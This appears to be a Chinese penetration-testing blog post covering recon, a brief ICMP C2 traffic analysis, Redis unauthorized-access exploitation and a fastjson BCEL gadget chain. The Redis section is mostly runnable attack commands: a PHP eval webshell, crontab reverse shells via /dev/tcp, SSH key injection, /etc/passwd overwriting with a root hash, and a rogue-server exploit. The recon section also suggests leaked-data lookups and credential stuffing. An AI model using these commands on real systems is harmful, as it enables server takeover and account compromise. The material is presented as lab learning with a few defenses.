<h3 id="1-域名收集–-备案收集"><a href="#1-域名收集–-备案收集" class="headerlink" title="1.域名收集–(备案收集)"></a>1.域名收集–(备案收集)</h3><p>通过子域名查询工具或是子域名查询网站,资产测绘等获取子域名</p>
<p>域名：通常指的是主域名，如”aliyun.com”，它直接指向一个网站，并且是由字母和数字组成的唯一标识符，后面通常伴随着顶级域（如.com、.cn等）。</p>
<p>子域名：是在主域名之下创建的域名分支，用于组织网站的不同部分或服务。例如，”api.aliyun.com”和”pay.aliyun.com”都是”aliyun.com”的子域名，它们分别指向该网站的不同服务区域。</p>
<h4 id="1-1在线收集子域名"><a href="#1-1在线收集子域名" class="headerlink" title="1.1在线收集子域名"></a>1.1<strong>在线收集子域名</strong></h4><h5 id="1-1-1-站长之家"><a href="#1-1-1-站长之家" class="headerlink" title="1.1.1 站长之家"></a>1.1.1 站长之家</h5><h5 id="1-1-2-IP138网站"><a href="#1-1-2-IP138网站" class="headerlink" title="1.1.2 IP138网站"></a>1.1.2 IP138网站</h5><h5 id="1-1-3-查子域"><a href="#1-1-3-查子域" class="headerlink" title="1.1.3 查子域"></a>1.1.3 查子域</h5><h4 id="1-2工具和资产测绘收集子域名"><a href="#1-2工具和资产测绘收集子域名" class="headerlink" title="1.2工具和资产测绘收集子域名"></a>1.2<strong>工具和资产测绘收集子域名</strong></h4><h5 id="1-2-1-oneforall-最好用-最全面"><a href="#1-2-1-oneforall-最好用-最全面" class="headerlink" title="1.2.1 oneforall(最好用,最全面)"></a>1.2.1 oneforall(最好用,最全面)</h5><p>因为需要配置环境,我直接在工具箱的目录下使用</p>
<p>cd D:\Network-Security-Tools\Online_tools\storage\OneForAll<br>..\Python311\python.exe oneforall.py –target <a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a> run<br>..\Python311\python.exe oneforall.py –targets .&#x2F;example.txt run</p>
<h5 id="1-2-2-JSFinder-从页面的js中提取"><a href="#1-2-2-JSFinder-从页面的js中提取" class="headerlink" title="1.2.2 JSFinder(从页面的js中提取)"></a>1.2.2 JSFinder(从页面的js中提取)</h5><h4 id="1-3-资产测绘平台"><a href="#1-3-资产测绘平台" class="headerlink" title="1.3 资产测绘平台"></a>1.3 资产测绘平台</h4><p>鹰图,微步,fofa,钟馗之眼,信安</p>
<h3 id="2-查询域名相关的信息"><a href="#2-查询域名相关的信息" class="headerlink" title="2.查询域名相关的信息"></a>2.查询域名相关的信息</h3><p>获得邮箱,名字,手机号等信息— 邮箱等信息或取后进行–社工库(sfzh,手机号,qq,邮箱)进行进一步查询信息(撞库)</p>
<p>社工库获取到</p>
<p>常用密码1, 常用密码2 — 进一步可以登录其他网站</p>
<h4 id="2-1域名注册信息"><a href="#2-1域名注册信息" class="headerlink" title="2.1域名注册信息"></a>2.1<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%9F%9F%E5%90%8D%E6%B3%A8%E5%86%8C&spm=1001.2101.3001.7020">域名注册</a>信息</h4><p>通过whois查询</p>
<h4 id="2-2域名备案信息查询"><a href="#2-2域名备案信息查询" class="headerlink" title="2.2域名备案信息查询"></a>2.2域名备案信息查询</h4><p><a target="_blank" rel="noopener" href="https://icp.aizhan.com/www.baidu.com/">https://icp.aizhan.com/www.baidu.com/</a></p>
<p>icp备案查询</p>
<h4 id="2-3-ICP备案号查信息-收集主-一级-域名"><a href="#2-3-ICP备案号查信息-收集主-一级-域名" class="headerlink" title="2.3 ICP备案号查信息(收集主(一级)域名)"></a>2.3 ICP备案号查信息(收集主(一级)域名)</h4><p>可以获取一些域名信息,或是所有人的信息</p>
<p><strong>使用备案号会查出很多信息,用域名的话只会查出当前域名的信息</strong></p>
<h4 id="2-4-通过SEO查询"><a href="#2-4-通过SEO查询" class="headerlink" title="2.4 通过SEO查询"></a>2.4 通过SEO查询</h4><p>可以获取到邮箱和注册人等信息</p>
<p>SEO，即搜索引擎优化（Search Engine Optimization），是一种利用搜索引擎的规则和算法来提升网站在搜索结果中的排名的技术和方法。</p>
<p>  具体而言，SEO包括了对网站结构、内容、代码、用户体验以及外部链接等方面的优化，旨在使网站更加符合搜索引擎的索引和排名机制。通过有效的SEO策略，网站可以在关键词搜索结果中获得更高的排名，从而吸引更多潜在用户访问，增加网站的可见性和流量。</p>
<h4 id="2-5-ssl证书查询"><a href="#2-5-ssl证书查询" class="headerlink" title="2.5 ssl证书查询"></a>2.5 ssl证书查询</h4><h4 id="2-6-IP查询"><a href="#2-6-IP查询" class="headerlink" title="2.6 IP查询"></a>2.6 IP查询</h4><h3 id="3-获取真实IP-判断有无使用CDN-waf"><a href="#3-获取真实IP-判断有无使用CDN-waf" class="headerlink" title="3.获取真实IP(判断有无使用CDN,waf)"></a>3.获取真实IP(判断有无使用CDN,waf)</h3><p>存在CDN–所以无法获取真实IP</p>
<p>每个域名都去找真实IP,waf</p>
<p>在线waf识别,通过公具进行识别,通过手动方式看是否拦截判断是否有waf</p>
<h4 id="3-1-多地ping"><a href="#3-1-多地ping" class="headerlink" title="3.1 多地ping"></a>3.1 多地ping</h4><p>多地ping能进行多地ping某个网址，可以理解为多个地域对同一个域名进行ping操作，就会看到大家</p>
<p>ping出来的ip地址不同，看到下图，多个独立IP地址,代表存在CDN</p>
<h5 id="cdn绕过"><a href="#cdn绕过" class="headerlink" title="cdn绕过"></a>cdn绕过</h5><p>1.使用工具绕过，效果不加<br>工具1：fuckcdn</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Tai7sy/fuckcdn">https://github.com/Tai7sy/fuckcdn</a></p>
<p>工具2：w8fuckcdn</p>
<p><a target="_blank" rel="noopener" href="https://github.com/boy-hack/w8fuckcdn">https://github.com/boy-hack/w8fuckcdn</a><br>2.历史DNS解析<br><a target="_blank" rel="noopener" href="https://x.threatbook.com/v5/domain/xiaoyunxi.wiki">https://x.threatbook.com/v5/domain/xiaoyunxi.wiki</a></p>
<p>3.子域名<br>使用cdn需要花费额外的成本，不可能给所有网站全部配置cdn，总有子域名是直接指向源站的，这个源</p>
<p>站ip和哪些使用cdn的网站，大概率是同一个网段</p>
<p>当然还有其他的方式进行查找,后面我会专门写一篇记录一下如何查找真实IP</p>
<p>总结：绕过cdn需要碰运气，不是100%绕过的</p>
<h3 id="4-收集旁站和C段IP"><a href="#4-收集旁站和C段IP" class="headerlink" title="4.收集旁站和C段IP"></a>4.收集旁站和C段IP</h3><p>什么是C段：比如在：127.127.127.4 这个IP上面有一个网站 127.4 这个服务器上面有网站我们可以想</p>
<p>想..他是一个非常大的站几乎没什么漏洞！但是在他同C段 127.127.127.1<del>127.127.127.255 这 1</del>255</p>
<p>上面也有服务器而且也有网站并且存在漏洞,那么我们就可以来渗透 1~255任何一个站 之后提权来嗅探</p>
<p>得到127.4 这台服务器的密码 甚至3389连接的密码后台登录的密码 如果运气好会得到很多的密码…</p>
<h5 id="1-利用工具"><a href="#1-利用工具" class="headerlink" title="1.利用工具"></a>1.利用工具</h5><p>1.御剑高速TCP端口扫描</p>
<p>2.ARL灯塔</p>
<p>3.直接ping ip段</p>
<p>在自己电脑ping就ok了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 117.xx.xx.0/24</span><br></pre></td></tr></table></figure>

<p>4.fofa等资产测绘进行查询</p>
<h3 id="5-端口探测-开放端口-服务-指纹识别"><a href="#5-端口探测-开放端口-服务-指纹识别" class="headerlink" title="5.端口探测(开放端口,服务,指纹识别)"></a>5.端口探测(开放端口,服务,指纹识别)</h3><p>使用nmap,goby,脚本工具,在线查询,潮汐指纹,插件等</p>
<h3 id="6-漏洞扫描"><a href="#6-漏洞扫描" class="headerlink" title="6.漏洞扫描"></a>6.漏洞扫描</h3><p>查看网站组件和框架等</p>
<p>系统漏洞&#x2F;历史漏洞+web漏洞扫描&#x2F;手动检查</p>
<p>进入后台,通过前面社工或收集的进行登录</p>
<h3 id="7-网站信息"><a href="#7-网站信息" class="headerlink" title="7.网站信息"></a>7.网站信息</h3><p>网站开发语言(java,php等)– 代码框架&#x2F;&#x2F;struts2 ,thinkphp,tomcat cms框架漏洞(wordpress,dedcms,discuz…)等</p>
<p>查找历史漏洞进行渗透测试</p>
<p>其他信息</p>
<h2 id="C2告警怎么处理·"><a href="#C2告警怎么处理·" class="headerlink" title="C2告警怎么处理·"></a>C2告警怎么处理·</h2><p>c2流量分析：</p>
<h6 id="1、正常的icmp流量"><a href="#1、正常的icmp流量" class="headerlink" title="1、正常的icmp流量"></a>1、正常的icmp流量</h6><p>数据包长度不大</p>
<h6 id="2、恶意的icmp流量"><a href="#2、恶意的icmp流量" class="headerlink" title="2、恶意的icmp流量"></a>2、恶意的icmp流量</h6><p>数据包长度明显过长</p>
<p><img src="/photo/image-20240613001855154.png" alt="image-20240613001855154"></p>
<p>且数据包没有data字段</p>
<h6 id="3、C2数据"><a href="#3、C2数据" class="headerlink" title="3、C2数据"></a>3、C2数据</h6><p><img src="/photo/image-20240613001927031.png" alt="image-20240613001927031"></p>
<p><strong>如果一来一回reply-request没有把命令回显结束，则会分包回显命令执行结果</strong><br>执行了ipconfig命令</p>
<p>总结<br>在当前的实验环境下，icmp流量抓取的相对容易，而且流量是明文传输，特征十分的明显。总结以下几点：<br>1、数据包长度过长<br>2、数包没有data字段<br>3、reply包携带明文的命令语句（同时没有info内容）<br>4、request包明文回显执行结果（info内容为 no response found）<br>5、一个数据包回显不完C2结果会以多个包的形式回显（期间reply数据包没有data字段且info为空）</p>
<h2 id="redis在windows和linux下怎么利用"><a href="#redis在windows和linux下怎么利用" class="headerlink" title="redis在windows和linux下怎么利用"></a>redis在windows和linux下怎么利用</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_26091745/article/details/117222362">https://blog.csdn.net/qq_26091745/article/details/117222362</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/602633454">https://zhuanlan.zhihu.com/p/602633454</a></p>
<h3 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h3><p>redis未授权访问漏洞的防范措施：</p>
<p>1.添加登录密码</p>
<p>2.修改默认端口</p>
<p>3.关闭端口</p>
<p>4.禁止以root用户权限启动，以低权限启动redis服务</p>
<h3 id="windows利用"><a href="#windows利用" class="headerlink" title="windows利用"></a>windows利用</h3><h3 id="linux利用"><a href="#linux利用" class="headerlink" title="linux利用"></a>linux利用</h3><h3 id="1、未授权利用"><a href="#1、未授权利用" class="headerlink" title="1、未授权利用"></a>1、未授权利用</h3><p>Redis 默认情况下，会绑定 .0.0.0.0:6379 ，如果没有才有相关的策略，比如添加防火墙规则避免其他非信任来源 限制ip访问等，那么就会将 Redis 服务暴露到公网上。如果没有设置密码认证的话(一般为空)，会导致任意用户在可以访问目标服务器的情况下，未授权访问 Redis 以及 读取 Redis 的数据。</p>
<p>在未授权的情况下，可以利用 Redis 自身提供的 config 命令进行写入shell、写SSH公钥、创建计划任务反弹shell 等。其思路都是先将 Redis 的本地数据库存放目录设置为 特定的目录，然后将 dbfilename (本地数据库文件名) 设置为你想写入的文件名称，最后在执行 save 或 bgsave 保存，那么就看在制定的目录下写入指定的文件了。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h ip //无需密码登录</span><br><span class="line">redis-cli -h host -p port -a password   //使用redis密码登入redis服务</span><br><span class="line">info</span><br></pre></td></tr></table></figure>

<p><img src="/photo/v2-849aaf66d1cdfed01feba63d788cea88_720w.webp" alt="img"></p>
<p>首先先来看一下info中有哪些信息：</p>
<p><img src="/photo/v2-6f264659c76fac629010c3a54b134bb5_720w.webp" alt="img"></p>
<p><img src="/photo/v2-08e41c69909a8b900cb7e1b923a2acb6_720w.webp" alt="img"></p>
<h4 id="（1）写WebShell"><a href="#（1）写WebShell" class="headerlink" title="（1）写WebShell"></a>（1）写WebShell</h4><p>原理：在数据库中插入一条Webshell数据，将此Webshell的代码作为value，key值随意（x），然后通过修改数据库的默认路径为&#x2F;www&#x2F;wwwroot&#x2F;html和默认的缓冲文件shell.php，把缓冲的数据保存在文件里，这样就可以在服务器端的&#x2F;www&#x2F;wwwroot&#x2F;html下生成一个Webshell。</p>
<p>条件：</p>
<ul>
<li>redis和网站要在同一台服务器下</li>
<li>知道网站根目录的绝对路径</li>
<li>运行redis服务的用户必须有权限向目录写文件</li>
</ul>
<p>利用方法：将dir设置为&#x2F;www&#x2F;wwwroot&#x2F;html，将指定本地数据库存放目录设置为&#x2F;www&#x2F;wwwroot&#x2F;html；将dbfilename设置为文件名shell.php，即指定本地数据库文件名为shell.php；再执行save或bgsave，则我们就可以写入一个路径为&#x2F;www&#x2F;wwwroot&#x2F;html&#x2F;shell.php的Webshell文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">redis -cli -h 192.168.x.x 连接目标服务器</span><br><span class="line"></span><br><span class="line">config set dir &quot;/var/www/html&quot; 设置保存文件路径</span><br><span class="line"></span><br><span class="line">config set dbfilename shell.php 设置保存文件名</span><br><span class="line"></span><br><span class="line">set x &quot;\n\n&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;\n&quot; 将webshell写入x键值中</span><br><span class="line"></span><br><span class="line">save 保存</span><br></pre></td></tr></table></figure>

<p>首先我们在服务器的根目录中创建一个&#x2F;www&#x2F;root的文件夹并用python启动一个临时的HTTP服务。</p>
<p><img src="/photo/v2-b64b0f723875071efd12f34997c453e2_720w.webp" alt="img"></p>
<p><img src="/photo/v2-d79b2905161584f15d2d8ae02ca6ab8a_720w.webp" alt="img"></p>
<p>获取当前路径</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Config get dir</span><br></pre></td></tr></table></figure>



<p><img src="/photo/v2-8b6ec2d19c4b46678cd3ce016f82564f_720w.webp" alt="img"></p>
<p>设置&#x2F;www&#x2F;root为指定目录</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Config set dir</span><br></pre></td></tr></table></figure>



<p><img src="/photo/v2-1a14ff9cc7c49f9a074b588f091cdbd0_720w.webp" alt="img"></p>
<p>写入文件</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set abc &quot;\n\n&lt;?php phpinfo();?&gt;&quot; //写入，这里还有一种写法：set abc”\n\n&lt;xxx&gt;”nx，末尾的nx代表仅当键abc不存在的时候，才会创建。这样可以防止误更新到业务在用的键名，引发业务的异常。</span><br></pre></td></tr></table></figure>



<p><img src="/photo/v2-b3b4f43da9635c4eb48f74bf5522a200_720w.png" alt="img"></p>
<p>设置写文件</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Config set dbfilename test.php</span><br></pre></td></tr></table></figure>



<p><img src="/photo/v2-4d1cbfcc094548a32c19243cecc3abe2_720w.webp" alt="img"></p>
<p>随后尝试访问：</p>
<p><img src="/photo/v2-0b9e0977e3430d1f656faaaeeaad31be_720w.webp" alt="img"></p>
<p>这里是肯定不会解析的，因为只是一个HTTP服务，可以看到目录下也有test.php，成功写入：</p>
<p><img src="/photo/v2-00f7c6e01bf80277f75883babffcb18e_720w.png" alt="img"></p>
<h3 id="2、写Crontab"><a href="#2、写Crontab" class="headerlink" title="2、写Crontab"></a>2、写Crontab</h3><p>条件：</p>
<ul>
<li>访问目标服务器的redis不需要密码</li>
<li>redis对&#x2F;var&#x2F;spool&#x2F;cron有写入权限</li>
</ul>
<p>利用定时任务反弹shell在目标系统是Centos上可用，Ubuntu上有限制</p>
<p>理由如下：</p>
<p>1.默认redis写文件后是644的权限，但ubuntu要求执行定时任务件&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;权限必须是600也就是-rw——-才会执行，否则会报错，而Centos的定时任务文件权限644也能执行 2.redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错 3.两个系统的定时任务文件目录不同</p>
<p>利用主从复制getshell</p>
<p>Ubuntu</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Config set dir /var/spool/cron</span><br><span class="line">set abcd &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.0.13/1234 0&gt;&amp;1\n\n&quot;</span><br><span class="line">Config set filename root</span><br><span class="line">Save</span><br><span class="line"></span><br><span class="line">定时任务用的表达式 ：Cron表达式是一个字符串，该字符串由6个空格分为7个域，每一个域代表一个时间含义。分 时 天 月 周 user-name(用户) command(命令) 比如每过一分钟向root用户的定时任务中写入反弹连接命令</span><br><span class="line"></span><br><span class="line">(1) config set dir /var/spool/cron/ //目录切换到定时任务的文件夹中</span><br><span class="line"></span><br><span class="line">(2) config set dbfilename root //设置保存文件名</span><br><span class="line"></span><br><span class="line">(3)set x &quot;\n * * * * * bash -i &gt;&amp; /dev/tcp/192.168.96.222/7777 0&gt;&amp;1\n&quot; //将反弹shell写入x键值中</span><br><span class="line"></span><br><span class="line">(4)save //保存</span><br></pre></td></tr></table></figure>



<p><img src="/photo/v2-21c3de34533e8404f429fabe16e00815_720w.webp" alt="img"></p>
<p><img src="/photo/v2-5e93d83c4f4b48313baf846895cc29cc_720w.png" alt="img"></p>
<p>在Ubuntu中尝试之后，发现并没有反弹shell回来，不知道为什么，查询了文章看到有大佬说：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这个方法只能在Centos上使用，Ubuntu上是行不通的，原因如下:</span><br><span class="line">因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件/var/spool/cron/crontabs/&lt;username&gt;权限必须是600也就是-rw———-才会执行，否则会报错(root) INSECURE MODE (mode 0600 expected)，而Centos的定时任务文件/var/spool/cron/&lt;username&gt;权限644也能执行</span><br></pre></td></tr></table></figure>



<p>所以这里更换Centos尝试，搭建步骤与上文一致，发现centos确实在1分钟左右就返回了shell：</p>
<p><img src="/photo/v2-79289f3c95aed2f9776c810ec7ff6a0e_720w.png" alt="img"></p>
<p>按照上面CentOs和Ubuntu写文件的说法，可以来看一下写入的文件权限大小。</p>
<p>Linux权限对应表：</p>
<p><img src="/photo/v2-b1012b08aa8a14f9945bf9760270a792_720w.webp" alt="img"></p>
<p><img src="/photo/v2-5ac37a90e7c874492ffd4017a4a7ca2b_720w.webp" alt="img"></p>
<p>可以看到CentOs中的是644：</p>
<p><img src="/photo/v2-e6d0b7c000cd4d35dc13084db17f8ffa_720w.webp" alt="img"></p>
<p>Ubuntu中也是644，那么如果真如那篇文章所说，必须是600才会执行的话，那么确实Ubuntu无法执行（</p>
<h3 id="3、写SSH公钥"><a href="#3、写SSH公钥" class="headerlink" title="3、写SSH公钥"></a>3、写SSH公钥</h3><p>条件：</p>
<ul>
<li>Redis服务使用root启动</li>
<li>服务器开启了SSH，但是允许密钥登录</li>
</ul>
<p>这里就用Centos7搭建的redis作为环境。</p>
<p>首先配置ssh密钥登录：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/ssh/sshd_config</span><br><span class="line"> </span><br><span class="line">RSAAuthentication yes # 开启密钥登入的认证方式</span><br><span class="line"> </span><br><span class="line">PubkeyAuthentication yes # 开启密钥登入的认证方式</span><br><span class="line"> </span><br><span class="line">PermitRootLogin yes # 此处请留意 root 用户能否通过 SSH 登录，默认为yes</span><br><span class="line"> </span><br><span class="line"># 可以正常用密钥登录了，再把这里改为no</span><br><span class="line">PasswordAuthentication yes #当我们完成全部设置并以密钥方式登录成功后，可以禁用密码登录。这里我们先不禁用，先允许密码登陆</span><br></pre></td></tr></table></figure>



<p><img src="/photo/v2-a329cd85396702a6cb39f061eff0218e_720w.webp" alt="img"></p>
<p>然后重启sshd服务：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart sshd</span><br></pre></td></tr></table></figure>



<p>随后尝试连接会提示：</p>
<p><img src="/photo/v2-344ee306a4e00500dd4ea204f236d96e_720w.webp" alt="img"></p>
<p>随后在Mac上生成密钥：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>



<p>设置.ssh目录</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Config set dir /root/.ssh/</span><br></pre></td></tr></table></figure>



<p>写入公钥</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(echo -e &quot;\n\n&quot;; cat /root/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; /root/.ssh/key.txt</span><br><span class="line">cat /root/.ssh/key.txt | redis-cli -h 192.168.0.148 -x set xxx</span><br><span class="line"> </span><br><span class="line"># Mac</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat ./id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; ./key.txt</span><br><span class="line">cat /root/.ssh/key.txt | redis-cli -h 192.168.0.148 -x set xxx</span><br></pre></td></tr></table></figure>



<p><img src="/photo/v2-b41eda7b59cec26f16eb2e0c161129b4_720w.png" alt="img"></p>
<p>随后就可以使用shh直接连接了：</p>
<p><img src="/photo/v2-092fb7d4758b73a9b4ab5dfc17cbc88e_720w.webp" alt="img"></p>
<h3 id="4、重置Linux账户密码"><a href="#4、重置Linux账户密码" class="headerlink" title="4、重置Linux账户密码"></a>4、重置Linux账户密码</h3><p>原理：若&#x2F;etc&#x2F;passwd和&#x2F;etc&#x2F;shadow中同时存在密码，系统会使用&#x2F;etc&#x2F;passwd中的密码进行验证 &#x2F;etc&#x2F;passwd-是&#x2F;etc&#x2F;passwd的备份，成功登录系统后，通过替换&#x2F;etc&#x2F;passwd-文件，可以恢复root用户的原密码。</p>
<p>Linux存账户密码一般会有&#x2F;etc&#x2F;passwd和&#x2F;etc&#x2F;shadow，如果两个出现冲突的话，会以&#x2F;etc&#x2F;passwd为准。</p>
<p>另外，&#x2F;etc&#x2F;passwd的权限一般是644，比&#x2F;etc&#x2F;shadow的640要高。而且，redis写入是覆盖的，也就是说，写入进去覆盖之后，其他的都没了，这个过程是有创且不可逆的。</p>
<p>这里用到一个大佬的<em>dockerfile: <a href="https://link.zhihu.com/?target=https://github.com/justonly1/DockerRedis">https://github.com/justonly1/DockerRedis</a></em></p>
<p>或者docker直接下载也可以：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker pull ju5ton1y/redis:latest</span><br><span class="line">docker run -itd -p 6379:6379 -p 6378:22 ju5ton1y/redis:latest</span><br><span class="line"># 启动之后需要进入容器</span><br><span class="line">/etc/init.d/ssh restart</span><br></pre></td></tr></table></figure>



<p><img src="/photo/v2-176a24ed236d33a5240acd0d99ce553f_720w.webp" alt="img"></p>
<p><img src="/photo/v2-933e7ac23f9323737c4335c710e31e70_720w.webp" alt="img"></p>
<p>随后生成一串密码为YourNewPasswd%1024的密文。</p>
<p>另外这段代码</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import crypt; print crypt.crypt(&quot;YourNewPasswd%1024&quot;,&quot;$6$my0salt0&quot;)&#x27;</span><br></pre></td></tr></table></figure>



<p>mac下会这样：</p>
<p><img src="/photo/v2-8003421e5d67bf627f15b827d8e37cea_720w.webp" alt="img"></p>
<p>在kali下就好了：</p>
<p><img src="/photo/v2-9abbc2061f4e3107607746d3e349b861_720w.webp" alt="img"></p>
<p>然后写入&#x2F;etc&#x2F;passwd</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET abcd &quot;\n\n root:$6$my0salt0$yCCi..OsWo8n5MaBFytGaZ0qTcHErSaoyvAVvMXFEnwgMOtpm6sYbtwUR4I.GA7Kt0X0KruYifS6c9.FkDN53.:0:0:root:/root:/bin/bash\nsshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin\n\n&quot;</span><br></pre></td></tr></table></figure>



<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">config set dbfilename passwd</span><br><span class="line">save</span><br></pre></td></tr></table></figure>



<p>然后就可以使用YourNewPasswd%1024这个密码登录了：</p>
<p><img src="/photo/v2-4cea4b072174aaeda9348ddd0dd2671e_720w.webp" alt="img"></p>
<p>2、主从备份</p>
<p>这里用vulhub的靶场</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">cd redis/4-unacc/</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>



<p><img src="/photo/v2-cde0fb25133b4016b099fec0c8a86d1f_720w.webp" alt="img"></p>
<p><img src="/photo/v2-dfabc2f9551e97ffcf6c2c61a35de67b_720w.webp" alt="img"></p>
<p>exp用这个<a href="https://link.zhihu.com/?target=https://github.com/n0b0dyCN/redis-rogue-server.git">https://github.com/n0b0dyCN/redis-rogue-server.git</a></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/n0b0dyCN/redis-rogue-server.git</span><br><span class="line">python3 redis-rogue-server.py --rhost 192.168.0.13 --lhost 192.168.0.139</span><br><span class="line"># rhost是redis，lhost是kali</span><br></pre></td></tr></table></figure>



<p>这执行的时候会遇到错误：</p>
<p><img src="/photo/v2-bca288a2aa7f699e1636222952980b2f_720w.webp" alt="img"></p>
<p><img src="/photo/v2-3d8becc05eb7696da49e8cb8bf2028ec_720w.webp" alt="img"></p>
<p>多跑几次就行：</p>
<p><img src="/photo/v2-0ce4628aa48fda8e9fbd4516c281d7dd_720w.png" alt="img"></p>
<p>redis有5种数据结构，如下：</p>
<ul>
<li>String</li>
<li>Hash</li>
<li>List</li>
<li>Set</li>
<li>Sorted Set</li>
</ul>
<h2 id="fastjson不出网怎么打"><a href="#fastjson不出网怎么打" class="headerlink" title="fastjson不出网怎么打"></a>fastjson不出网怎么打</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/R0ser1/p/15918626.html">https://www.cnblogs.com/R0ser1/p/15918626.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Dokii_i/article/details/135695391">https://blog.csdn.net/Dokii_i/article/details/135695391</a></p>
<p>BCEL的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一个子项目，BCEL库提供了一系列用于分析、创建、修改Java Class文件的API。就这个库的功能来看，其使用面远不及同胞兄弟们，但是他比Commons Collections特殊的一点是，它被包含在了原生的JDK中，位于<code>com.sun.org.apache.bcel</code>摘自<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">P牛BCEL ClassLoader去哪里了</a></p>
<p>通过BCEL，这个包中有个类<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>，他是一个ClassLoader，但是他重写了Java内置的<code>ClassLoader#loadClass()</code>方法。 在<code>ClassLoader#loadClass()</code>中，其会判断类名是否是<code>$$BCEL$$</code>开头，如果是的话，将会对这个字符串进行decode。可以理解为是传统字节码的HEX编码，再将反斜线替换成<code>$</code>。默认情况下外层还会加一层GZip压缩。编写恶意类之后，然后使用过BCEL提供的两个类<code>Repository</code> 和 <code>Utility</code> 来利用： <code>Repository</code>用于将一个<code>Java Class</code>先转换成原生字节码，当然这里也可以直接使用javac命令来编译java文件生成字节码； <code>Utility</code>用于将原生的字节码转换成BCEL格式的字节码</p>
<p>这个poc最开始有点看不懂，这里贴一个其他师傅发的利用链，我们来分析下，结合tomcat-dbcp这个类进行组合达到触发fastjson的目的：</p>
<p>tomcat-dbcp里面有一个BasicDataSource类，在反序列化的时候会调用getConnection()方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BasicDataSource.getConnection() -&gt; createDataSource() -&gt; createConnectionFactory()</span><br></pre></td></tr></table></figure>

<p><img src="/photo/05bf6381208f43478abadbd735e83e38.png" alt="img"></p>
